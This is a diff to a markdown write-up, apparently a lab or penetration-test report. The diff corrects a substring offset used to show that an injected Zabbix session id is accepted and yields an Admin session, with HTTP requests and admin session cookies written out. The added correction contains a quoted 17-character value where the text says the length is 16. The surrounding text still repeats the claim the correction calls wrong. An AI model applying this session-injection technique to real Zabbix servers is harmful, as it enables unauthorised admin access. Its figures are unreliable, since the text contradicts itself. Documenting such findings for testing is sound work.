@@ -258,10 +258,17 @@ The naive check ("does the dashboard look different?") is weak, because a reject
 
 ```
 GET /index.php            Cookie: zbx_sessionid=<guest session>
-  → <input name="sid" value="a95a8bb4bc7ac3c2">     substr("52ee027590fd705aa95a8bb4bc7ac3c2", 8, 16) ✓ guest
+  → <input name="sid" value="a95a8bb4bc7ac3c2">     substr("52ee027590fd705aa95a8bb4bc7ac3c2", 16, 16) ✓ guest
+
+> **Corrected offset.** Both lines above originally read `substr(sid, 8, 16)`, which yields
+> `289a0bb44e80e56c` and `90fd705aa95a8bb4b` — neither matches. The real offset is **16**
+> (characters 17–32, the tail) in both cases, so the method held while the stated offset
+> did not, and the "two predictions, two matches" claim was wrong as written. What the
+> correction strengthens: **both** admin and guest use the *same* offset, so the sessionid
+> is the credential in one fixed position rather than a coincidence of two runs.
 
 GET /zabbix.php?action=dashboard.view   Cookie: zbx_sessionid=03fb5847289a0bb44e80e56c2a0d6338
-  → <input name="sid" value="4e80e56c2a0d6338">     substr("03fb5847289a0bb44e80e56c2a0d6338", 8, 16) ✓ ADMIN
+  → <input name="sid" value="4e80e56c2a0d6338">     substr("03fb5847289a0bb44e80e56c2a0d6338", 16, 16) ✓ ADMIN
 ```
 
 Two different predictions, two different matches. The injected id is being used, and the session is `Admin`.
